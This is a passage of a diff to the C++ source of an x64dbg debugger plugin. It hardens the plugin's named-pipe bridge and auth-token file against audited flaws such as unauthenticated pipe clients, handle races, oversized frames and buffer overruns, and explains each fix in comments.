+                // note above); either way the wait handles are untrustworthy,
+                // so stop rather than spin.
+                LogError("Pipe connect wait failed: result=%lu error=%d",
+                         (unsigned long)waitResult, GetLastError());
+                CancelIo(g_pipeServer);
+                CloseHandle(overlapped.hEvent);
+                ClosePipeServerHandle();
+                return 1;
             }
         } else if (!connected && error != ERROR_PIPE_CONNECTED) {
             LogError("ConnectNamedPipe failed: %d", error);
             CloseHandle(overlapped.hEvent);
-            CloseHandle(g_pipeServer);
-            g_pipeServer = INVALID_HANDLE_VALUE;
+            ClosePipeServerHandle();
             continue;
         } else {
             LogInfo("HTTP server connected to pipe");
         }
 
         CloseHandle(overlapped.hEvent);
+
+        // F-17: authenticate the peer BEFORE dispatching anything. A rejected
+        // client is disconnected and the instance recreated, so a hostile
+        // process cannot hold the single pipe instance open to lock the real
+        // server out either.
+        if (!IsPipeClientAuthorised(g_pipeServer)) {
+            DisconnectNamedPipe(g_pipeServer);
+            ClosePipeServerHandle();
+            continue;
+        }
 
         // Handle requests from HTTP server
         while (g_running) {
@@ -3769,18 +4665,80 @@ static DWORD WINAPI PipeServerThread(LPVOID lpParam) {
             }
 
             if (requestLength > Protocol::MAX_MESSAGE_SIZE) {
-                LogError("Request too large: %u bytes", requestLength);
-                break;
+                // AUDIT (oversized message killed the bridge): this used to
+                // `break`, which tears down the connection. The HTTP server
+                // treats a lost pipe as fatal and exits, so ONE oversized
+                // request permanently disabled the bridge until x64dbg was
+                // restarted -- a denial of service out of a malformed frame.
+                //
+                // Instead: drain the oversized message off the pipe so the
+                // stream stays framed, reply with an error, and carry on. The
+                // pipe is in message mode, so ReadFile returns ERROR_MORE_DATA
+                // for each chunk of the message that does not fit and succeeds
+                // on the last one; the iteration bound stops a peer that
+                // announces a huge length and then dribbles it forever.
+                LogError("Request too large: %u bytes (draining)", requestLength);
+
+                bool drained = false;
+                char drainBuffer[8192];
+                const int MAX_DRAIN_CHUNKS = 4096;  // 32 MiB of dribble, then give up
+                for (int chunk = 0; chunk < MAX_DRAIN_CHUNKS; chunk++) {
+                    DWORD drainRead = 0;
+                    if (ReadFile(g_pipeServer, drainBuffer, (DWORD)sizeof(drainBuffer), &drainRead, nullptr)) {
+                        drained = true;   // final chunk of the message
+                        break;
+                    }
+                    if (GetLastError() != ERROR_MORE_DATA) {
+                        break;            // broken pipe or a real error
+                    }
+                }
+
+                if (!drained) {
+                    LogError("Could not drain oversized request; dropping connection");
+                    break;
+                }
+
+                std::string tooLarge = BuildJsonResponse(false,
+                    "\"error\":\"Request exceeds the maximum message size\"");
+                uint32_t tooLargeLength = static_cast<uint32_t>(tooLarge.size());
+                DWORD tooLargeWritten = 0;
+                if (!WriteFile(g_pipeServer, &tooLargeLength, sizeof(tooLargeLength), &tooLargeWritten, nullptr) ||
+                    !WriteFile(g_pipeServer, tooLarge.c_str(), tooLargeLength, &tooLargeWritten, nullptr)) {
+                    LogError("Failed to report oversized request: %d", GetLastError());
+                    break;
+                }
+                continue;
+            }
+
+            // A zero-length frame carries nothing to dispatch, and
+            // std::vector<char>(0).data() may be null -- constructing a string
+            // from a null pointer is UB even with a zero count. Answer and
+            // carry on rather than tearing the connection down.
+            if (requestLength == 0) {
+                LogError("Empty request frame; ignoring");
+                continue;
             }
 
             // Read request data
             std::vector<char> buffer(requestLength);
+            bytesRead = 0;
             if (!ReadFile(g_pipeServer, buffer.data(), requestLength, &bytesRead, nullptr)) {
                 LogError("Failed to read request: %d", GetLastError());
                 break;
             }
 
-            std::string request(buffer.data(), requestLength);
+            // Use what was ACTUALLY read, not what the length prefix promised
+            // (CWE-252). The two differ on a short read, and building the
+            // string from requestLength then tacked the vector's zero-filled
+            // tail onto the JSON. Not an info leak -- std::vector<char>(n)
+            // value-initialises -- but the parser saw a frame the peer never
+            // sent.
+            if (bytesRead != requestLength) {
+                LogError("Short request frame: expected %u bytes, got %lu",
+                         requestLength, (unsigned long)bytesRead);
+            }
+
+            std::string request(buffer.data(), bytesRead);
             LogInfo("Received request: %s", request.c_str());
 
             // Parse request type and route to appropriate handler
@@ -4087,10 +5045,10 @@ static DWORD WINAPI PipeServerThread(LPVOID lpParam) {
             }
         }
 
-        // Disconnect client
+        // Disconnect client. ClosePipeServerHandle (not a bare CloseHandle) so
+        // the close is serialised against pluginStop's CancelIoEx.
         DisconnectNamedPipe(g_pipeServer);
-        CloseHandle(g_pipeServer);
-        g_pipeServer = INVALID_HANDLE_VALUE;
+        ClosePipeServerHandle();
     }
 
     LogInfo("Named Pipe server thread stopped");
@@ -4163,6 +5121,12 @@ static bool SpawnHTTPServer() {
     }
 
     g_serverProcess = pi.hProcess;
+    // F-17: record the PID the pipe peer must match. g_serverProcess is kept
+    // open for the plugin's lifetime, which is what makes this PID stable --
+    // Windows will not recycle a PID while a handle to the process is open, so
+    // "client PID == g_serverProcessId" cannot be satisfied by an impostor that
+    // waited for the real server to exit.
+    g_serverProcessId.store(pi.dwProcessId);
     CloseHandle(pi.hThread);  // Don't need thread handle
 
     // Clear token from environment immediately after spawn (child already inherited it)
@@ -4181,6 +5145,10 @@ static bool SpawnHTTPServer() {
         } else if (exitCode == 1) {
             LogError("Server returned error 1 - check: pipe connection, auth token file, or port 8765 in use");
         }
+        // F-17: the handle that pinned this PID is about to be closed, so the
+        // PID may be recycled. Clear it, or the pipe would authorise whatever
+        // process next receives that PID.
+        g_serverProcessId.store(0);
         CloseHandle(g_serverProcess);
         g_serverProcess = nullptr;
         return false;
@@ -4263,9 +5231,26 @@ void MenuEntryCallback(CBTYPE cbType, PLUG_CB_MENUENTRY* info) {
 // Plugin initialization
 bool pluginInit(PLUG_INITSTRUCT* initStruct) {
     g_pluginHandle = initStruct->pluginHandle;
+
+    // Initialise the pipe-handle lock here: x64dbg calls pluginit once, on one
+    // thread, before the pipe thread exists. Doing it lazily from whichever
+    // thread got there first would be the very race the lock exists to close.
+    if (!g_pipeHandleLockInit) {
+        InitializeCriticalSection(&g_pipeHandleLock);
+        g_pipeHandleLockInit = true;
+    }
+
     LogInfo("Initializing Obsidian v%s", PLUGIN_VERSION_STR);
     return true;
 }
+
+// How long pluginStop is willing to wait for PipeServerThread to leave this
+// DLL's code. It must exceed the longest uninterruptible span in that thread.
+// With the F-20 fix the wait handlers abort within one 50 ms poll interval, and
+// the only other blocking calls are pipe I/O that CancelIoEx unblocks, so 10 s
+// is generous rather than tight -- and the point of being generous is that the
+// timeout branch below is a genuine last resort, not a routine occurrence.
+static const DWORD PIPE_THREAD_SHUTDOWN_TIMEOUT_MS = 10000;
 
 void pluginStop() {
     LogInfo("Stopping plugin");
@@ -4273,29 +5258,82 @@ void pluginStop() {
     // Stop pipe server
     g_running = false;
 
-    // Signal shutdown event to wake up pipe thread
+    // Signal shutdown event to wake up pipe thread. This is what pulls the
+    // WAIT_PAUSED / WAIT_RUNNING / WAIT_DEBUGGING poll loops out early (F-20).
     if (g_shutdownEvent) {
         SetEvent(g_shutdownEvent);
     }
 
-    // Close pipe to force any pending I/O to complete
-    if (g_pipeServer != INVALID_HANDLE_VALUE) {
-        DisconnectNamedPipe(g_pipeServer);
-        CloseHandle(g_pipeServer);
-        g_pipeServer = INVALID_HANDLE_VALUE;
+    // Unblock any pipe I/O the thread is sitting in, WITHOUT closing the handle.
+    //
+    // AUDIT (handle-recycling race / double close): this used to
+    // CloseHandle(g_pipeServer) from here while PipeServerThread was inside
+    // ReadFile/WriteFile on that same handle and would itself CloseHandle it on
+    // the way out. Two threads closing one handle is a double close, and the
+    // window between the close here and the thread's next use of g_pipeServer
+    // is a window in which Windows can hand that numeric handle value to a
+    // completely unrelated object -- the thread would then read from, write to,
+    // or close whatever that turned out to be.
+    //
+    // Ownership is now unambiguous: PipeServerThread creates and closes the
+    // handle, and nobody else ever closes it. pluginStop may only CANCEL I/O on
+    // it, under g_pipeHandleLock so the handle cannot be closed mid-call.
+    // CancelIoEx (not CancelIo) is required because it cancels operations
+    // issued by OTHER threads.
+    if (g_pipeHandleLockInit) {
+        EnterCriticalSection(&g_pipeHandleLock);
+        if (g_pipeServer != INVALID_HANDLE_VALUE) {
+            CancelIoEx(g_pipeServer, nullptr);
+            DisconnectNamedPipe(g_pipeServer);
+        }
+        LeaveCriticalSection(&g_pipeHandleLock);
     }
 
-    // Wait for pipe thread to exit (should be quick now with shutdown event)
+    // Wait for the pipe thread to exit.
+    //
+    // F-20: this used to wait 1000 ms and then carry on regardless. Carrying on
+    // means returning from plugstop(), which is x64dbg's cue to FreeLibrary
+    // this DLL -- while a thread is still running inside it. That is a
+    // use-after-free of the plugin image, and it was reachable from a plain
+    // request because the wait handlers could block for five minutes.
+    //
+    // So: wait long enough for the handshake above to work, and if the thread
+    // STILL has not exited, do not let the unload happen. Pinning the module
+    // (GET_MODULE_HANDLE_EX_FLAG_PIN) makes the loader ignore the FreeLibrary,
+    // deliberately leaking this DLL's image, its thread handle and its events
+    // for the remaining life of the process. Leaking is the correct trade:
+    // a leaked mapping costs memory, executing freed code costs control of the
+    // process.
     if (g_pipeThread) {
-        DWORD waitResult = WaitForSingleObject(g_pipeThread, 1000);
-        if (waitResult == WAIT_TIMEOUT) {
-            LogError("Pipe thread did not exit in time");
+        DWORD waitResult = WaitForSingleObject(g_pipeThread, PIPE_THREAD_SHUTDOWN_TIMEOUT_MS);
+        if (waitResult != WAIT_OBJECT_0) {
+            LogError("Pipe thread did not exit within %lu ms (wait result %lu) -- "
+                     "pinning the plugin module to prevent an unload while it is still running",
+                     (unsigned long)PIPE_THREAD_SHUTDOWN_TIMEOUT_MS, (unsigned long)waitResult);
+
+            // FROM_ADDRESS wants any address inside this module; a static
+            // global is used rather than a function pointer because casting a
+            // function pointer to LPCSTR is only conditionally supported.
+            HMODULE pinned = nullptr;
+            if (!GetModuleHandleExA(
+                    GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS | GET_MODULE_HANDLE_EX_FLAG_PIN,
+                    (LPCSTR)&g_pipeHandleLockInit,
+                    &pinned)) {
+                LogError("Failed to pin plugin module: %d -- unload may crash", GetLastError());
+            }
+
+            // Intentionally NOT closing g_pipeThread, g_shutdownEvent or
+            // g_pipeReadyEvent: the still-running thread dereferences all three.
+            // Return early so the token file and server process are left alone
+            // too -- the thread may still be servicing a request against them.
+            LogInfo("Plugin stopped (pipe thread still running; resources intentionally leaked)");
+            return;
         }
         CloseHandle(g_pipeThread);
         g_pipeThread = nullptr;
     }
 
-    // Cleanup events
+    // Cleanup events. Safe now: the pipe thread has provably exited.
     if (g_shutdownEvent) {
         CloseHandle(g_shutdownEvent);
         g_shutdownEvent = nullptr;
@@ -4318,7 +5356,36 @@ void pluginStop() {
         WaitForSingleObject(g_serverProcess, 2000);
         CloseHandle(g_serverProcess);
         g_serverProcess = nullptr;
+        // F-17: the PID stops being pinned the moment this handle closes.
+        g_serverProcessId.store(0);
     }
+
+    // AUDIT (dead Reset() methods): g_traceState / g_apiLogState /
+    // g_coverageState / g_antiDebugState each defined a Reset() that nothing
+    // ever called. Dead cleanup code is worse than none -- a reader sees it and
+    // assumes teardown happens. It does matter here: g_traceState::Reset is the
+    // only thing that fcloses a trace log still open at shutdown, and the state
+    // objects have static storage duration, so a plugin unloaded and reloaded
+    // inside one x64dbg session would otherwise resume with the previous
+    // session's entries and an inherited "enabled" flag. Wire them up.
+    //
+    // Reached only on the clean-shutdown path: the timeout branch above returns
+    // early precisely because the pipe thread may still be inside these locks.
+    if (g_locksInitialized) {
+        EnterCriticalSection(&g_traceLock);
+        g_traceState.Reset();
+        LeaveCriticalSection(&g_traceLock);
+
+        EnterCriticalSection(&g_apiLogLock);
+        g_apiLogState.Reset();
+        LeaveCriticalSection(&g_apiLogLock);
+    }
+    if (g_coverageLockInitialized) {
+        EnterCriticalSection(&g_coverageLock);
+        g_coverageState.Reset();
+        LeaveCriticalSection(&g_coverageLock);
+    }
+    g_antiDebugState.Reset();
 
     // Delete authentication token file
     char tempPath[MAX_PATH];
@@ -4339,7 +5406,25 @@ void pluginStop() {
 }
 
 // Generate cryptographically secure random token
+//
+// AUDIT (buffer-size parameter was decorative): the loop bounded itself with
+// `i * 2 < tokenLength - 1` but then unconditionally wrote `outToken[64] = 0`,
+// so the terminator landed at a fixed offset no matter what size the caller
+// declared -- a 32-byte buffer would have been written 33 bytes past its end.
+// And because tokenLength is size_t, `tokenLength - 1` UNDERFLOWS to SIZE_MAX
+// when tokenLength is 0, turning the bound into "always true" and the guard
+// into a no-op. Both were survivable only because there is exactly one caller
+// and it passes 65; a second caller would have been an out-of-bounds write.
+// Honour tokenLength properly and refuse a buffer that cannot hold the result.
 static bool GenerateSecureToken(char* outToken, size_t tokenLength) {
+    // 32 random bytes -> 64 hex characters, plus the terminator.
+    const size_t requiredLength = 65;
+    if (!outToken || tokenLength < requiredLength) {
+        LogError("GenerateSecureToken: buffer of %zu bytes is too small (need %zu)",
+                 tokenLength, requiredLength);
+        return false;
+    }
+
     // Use Windows Crypto API for secure random generation
     HCRYPTPROV hCryptProv = 0;
     if (!CryptAcquireContextA(&hCryptProv, nullptr, nullptr, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT)) {
@@ -4357,14 +5442,91 @@ static bool GenerateSecureToken(char* outToken, size_t tokenLength) {
 
     CryptReleaseContext(hCryptProv, 0);
 
-    // Convert to base64-like hex string (64 characters)
+    // Convert to hex string (64 characters). The buffer size was validated on
+    // entry, so this writes exactly indices 0..63 and terminates at 64.
     const char* hexChars = "0123456789abcdef";
-    for (size_t i = 0; i < 32 && i * 2 < tokenLength - 1; i++) {
+    for (size_t i = 0; i < sizeof(randomBytes); i++) {
         outToken[i * 2] = hexChars[(randomBytes[i] >> 4) & 0x0F];
         outToken[i * 2 + 1] = hexChars[randomBytes[i] & 0x0F];
     }
-    outToken[64] = '\0';
+    outToken[sizeof(randomBytes) * 2] = '\0';
 
+    return true;
+}
+
+// Build a SECURITY_ATTRIBUTES whose DACL grants access to the current user
+// only. Two call sites: the auth-token file (F-15) and the named pipe (F-17,
+// which forward-declares this function because PipeServerThread is defined
+// above it). FILE_ALL_ACCESS ("FA") is the right mask for both -- the named
+// pipe rights, including FILE_CREATE_PIPE_INSTANCE, are inside it.
+//
+// Audit finding F-15: the token file was created with nullptr security
+// attributes, i.e. the process default DACL. On a normal desktop that already
+// resolves to roughly "this user + SYSTEM + Administrators" and the file lives
+// in the per-user %TEMP%, so the exposure was limited -- but the file contains
+// the bearer token that drives this debugger, and "limited by default policy"
+// is not the same as "restricted on purpose". A default DACL also inherits
+// whatever the token's default owner/group happens to be, which is not
+// something this plugin should be relying on.
+//
+// Threat that remains regardless: a sample detonated as the analyst's own user
+// can read this file (and the OBSIDIAN_AUTH_TOKEN environment variable) and
+// then drive x64dbg through the local HTTP API. An explicit user-only DACL
+// does not stop that -- same user, same access. Detonate untrusted samples as
+// a separate low-privilege principal or in a disposable VM; do not treat this
+// token as a boundary against the sample itself.
+//
+// On success the caller owns *outSd and must LocalFree it after the file is
+// created. On failure sa is left usable as "no explicit descriptor".
+static bool BuildCurrentUserOnlySecurity(SECURITY_ATTRIBUTES& sa, PSECURITY_DESCRIPTOR& outSd) {
+    outSd = nullptr;
+    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
+    sa.lpSecurityDescriptor = nullptr;
+    sa.bInheritHandle = FALSE;
+
+    HANDLE hToken = nullptr;
+    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
+        return false;
+    }
+
+    DWORD len = 0;
+    GetTokenInformation(hToken, TokenUser, nullptr, 0, &len);  // expected to fail, sizes the buffer
+    if (len == 0) {
+        CloseHandle(hToken);
+        return false;
+    }
+
+    std::vector<char> buffer(len);
+    if (!GetTokenInformation(hToken, TokenUser, buffer.data(), len, &len)) {
+        CloseHandle(hToken);
+        return false;
+    }
+    CloseHandle(hToken);
+
+    TOKEN_USER* tokenUser = reinterpret_cast<TOKEN_USER*>(buffer.data());
+    LPSTR sidString = nullptr;
+    if (!ConvertSidToStringSidA(tokenUser->User.Sid, &sidString)) {
+        return false;
+    }
+
+    // D:P              -> DACL, protected: block inherited ACEs from %TEMP%.
+    // (A;;FA;;;<sid>)  -> allow FILE_ALL_ACCESS to this user's SID and nobody
+    //                     else. Administrators and SYSTEM are deliberately not
+    //                     listed; they can take ownership anyway, so naming
+    //                     them would only widen the ACL for no gain.
+    std::string sddl = "D:P(A;;FA;;;";
+    sddl += sidString;
+    sddl += ")";
+    LocalFree(sidString);
+
+    PSECURITY_DESCRIPTOR sd = nullptr;
+    if (!ConvertStringSecurityDescriptorToSecurityDescriptorA(
+            sddl.c_str(), SDDL_REVISION_1, &sd, nullptr)) {
+        return false;
+    }
+
+    outSd = sd;
+    sa.lpSecurityDescriptor = sd;
     return true;
 }
 
@@ -4394,16 +5556,43 @@ void pluginSetup() {
         char tokenPath[MAX_PATH];
         snprintf(tokenPath, MAX_PATH, "%sx64dbg_mcp_token.txt", tempPath);
 
-        // Create file with default security (no custom SDDL)
+        // F-15: create the token file with an explicit DACL naming only the
+        // current user, instead of relying on the process default DACL.
+        SECURITY_ATTRIBUTES sa;
+        PSECURITY_DESCRIPTOR sd = nullptr;
+        bool haveSecurity = BuildCurrentUserOnlySecurity(sa, sd);
+        if (!haveSecurity) {
+            // Non-fatal: fall back to the default DACL (the previous
+            // behaviour) rather than leaving the bridge with no token file.
+            LogError("Could not build restrictive DACL for token file: %d "
+                     "(falling back to default security)", GetLastError());
+        }
+
+        // A security descriptor passed to CreateFileA applies only when the
+        // file is CREATED. With CREATE_ALWAYS an existing file is truncated
+        // and KEEPS ITS OLD DACL, so a stale token file from an earlier run
+        // (or one pre-created by someone else) would silently defeat the ACL
+        // above. Remove it first; a failure here is only interesting if the
+        // file actually exists.
+        if (!DeleteFileA(tokenPath) && GetLastError() != ERROR_FILE_NOT_FOUND) {
+            LogError("Could not remove stale token file before recreate: %d", GetLastError());
+        }
+
         HANDLE hFile = CreateFileA(
             tokenPath,
             GENERIC_WRITE,
             FILE_SHARE_READ,
-            nullptr,       // Default security - same user, same access
+            haveSecurity ? &sa : nullptr,   // explicit user-only DACL
             CREATE_ALWAYS,
             FILE_ATTRIBUTE_NORMAL,
             nullptr
         );
+
+        // The descriptor is consumed at creation time; the file keeps its ACL.
+        if (sd) {
+            LocalFree(sd);
+            sd = nullptr;
+        }
 
         if (hFile != INVALID_HANDLE_VALUE) {
             DWORD bytesWritten;
